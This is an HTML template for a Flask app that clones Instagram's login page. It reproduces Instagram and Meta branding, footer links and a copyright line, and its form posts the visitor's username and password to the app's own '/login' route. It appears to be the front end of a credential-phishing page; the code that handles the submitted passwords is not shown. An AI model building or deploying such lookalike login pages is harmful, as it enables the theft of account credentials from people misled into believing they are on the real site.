<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login Clone</title>
  <!-- Corrected CSS path -->
  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
</head>
<body>
  <div class="container">

    <div class="left-panel">
      <!-- Corrected image paths -->
      <img src="{{ url_for('static', filename='instagram-logo.png') }}" alt="Instagram Logo" class="logo-small">
      <h1 class="tagline">
        See everyday moments from your<br>
        <span class="highlight">close friends</span>.
      </h1>
      <img src="{{ url_for('static', filename='promo-image.jpg') }}" alt="Instagram promo" class="promo-img">
    </div>

    <div class="right-panel">
      <div class="login-box">
        <img src="{{ url_for('static', filename='instagram-logo.png') }}" alt="Instagram Logo" class="logo">
        
        <!-- UPDATED FORM -->
        <form action="/login" method="POST">
          <input type="text" name="username" placeholder="Mobile number, username or email" required>
          <input type="password" name="password" placeholder="Password" required>
          <button type="submit">Log in</button>
          <a href="#" class="forgot">Forgot password?</a>
          <div class="divider"><span>OR</span></div>
          <button type="button" class="fb-login">Log in with Facebook</button>
        </form>
        
        <div class="signup">
          <button class="create-account">Create new account</button>
        </div>
        <img src="{{ url_for('static', filename='meta-logo.png') }}" alt="Meta Logo" class="meta-logo">
      </div>
    </div>
  </div>

  <footer>
    <ul>
      <li><a href="#">Meta</a></li>
      <li><a href="#">About</a></li>
      <li><a href="#">Blog</a></li>
      <li><a href="#">Jobs</a></li>
      <li><a href="#">Help</a></li>
      <li><a href="#">Privacy</a></li>
      <li><a href="#">Terms</a></li>
      <li><a href="#">Locations</a></li>
      <li><a href="#">Instagram Lite</a></li>
      <li><a href="#">Meta AI</a></li>
      <li><a href="#">Threads</a></li>
      <li><a href="#">Contact Uploading & Non-Users</a></li>
      <li><a href="#">Meta Verified</a></li>
    </ul>

    <div class="footer-bottom">
      <select class="language">
        <option>English</option>
        <option>हिन्दी</option>
        <option>Español</option>
        <option>Français</option>
        <option>Deutsch</option>
      </select>
      <p>© 2026 Instagram from Meta</p>
    </div>
  </footer>
</body>
</html>
